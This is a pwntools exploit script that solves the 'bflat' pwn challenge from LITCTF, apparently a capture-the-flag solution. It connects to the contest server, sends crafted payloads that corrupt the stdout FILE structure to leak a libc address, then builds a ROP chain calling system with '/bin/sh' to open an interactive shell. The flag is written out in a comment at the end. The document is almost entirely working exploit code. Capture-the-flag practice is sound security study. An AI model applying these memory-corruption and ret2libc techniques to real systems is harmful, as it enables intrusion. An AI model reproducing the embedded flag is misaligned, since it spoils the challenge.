#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./bflat_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe

REMOTE_NC_CMD    = "nc litctf.org 31775"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *msort_with_tmp+390
c
"""
def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"5")

    payload = bstr(u32(b"%157")) + b" "
    payload += bstr(u32(b"$s\0\0")) + b" "
    payload += bstr(u32(b"$s\0\0")) + b" "
    payload += bstr(u32(b"%186")) + b" "
    payload += bstr(u32(b"$10c")) + b" "


    r.sendline(payload)

    r.sendline(b"-7")

    stdout = p64(0xfbad1887)+p64(0)*3
    payload = b"A"*7 + b"\x20\x01"

    r.sendline(b"A")
    r.sendline(payload) 
    r.sendline(stdout)
    r.sendline(stdout)
    r.sendline(stdout)

    r.recvuntil(b"\xe0")
    libc.address = u64(b"\xe0"+r.recv(7)) - libc.sym._IO_2_1_stdin_
    log.info(f"LIBC @ {hex(libc.address)}")

    r.sendline(b"2")

    payload = bstr(u32(b"%158")) + b" "
    payload += bstr(u32(b"$s\0\0")) + b" "
    r.sendline(payload)
    r.sendline(b"-7")

    rop = ROP(libc)
    payload = b"A"*8 + p64(rop.rdi.address) + p64(libc.binsh()) + p64(rop.ret.address) + p64(libc.sym.system)

    r.sendline(payload)

    r.interactive()
    #LITCTF{k4t0u_4ls0_l34rns_t0_pr0gram}

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print(e)
            continue